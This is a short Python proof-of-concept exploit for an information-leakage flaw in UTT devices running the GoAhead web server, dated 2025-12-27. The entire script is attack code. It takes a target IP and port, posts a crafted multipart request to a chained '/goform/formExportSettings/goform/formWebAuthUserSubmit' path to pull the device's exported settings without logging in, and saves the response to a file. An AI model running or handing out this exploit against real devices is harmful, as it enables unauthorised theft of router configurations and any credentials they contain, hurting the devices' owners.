import requests
import random,string
from requests_toolbelt.multipart.encoder import MultipartEncoder
import csv
import sys

print("UTT Goahead information leakage vulnerability 2025-12-27\n")

try:
    url='http://{}:{}/goform/formExportSettings/goform/formWebAuthUserSubmit'.format(sys.argv[1],sys.argv[2])
    boundary_str = '----WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
    body = MultipartEncoder(fields={
        "chkset": "on",
        "importConfig": ""
    }, boundary=boundary_str)
    try:
        resp=requests.post(url,data=body,verify=False,timeout=3)
        content=str(resp.content)
        print('[%s]'%sys.argv[1]+'  success!')
        file=open('test.txt','w')
        file.write(content)
    except:
        print('[%s]'%sys.argv[1]+'  failed!')
except:
    print('usage: python info_leak.py [ip] [port]')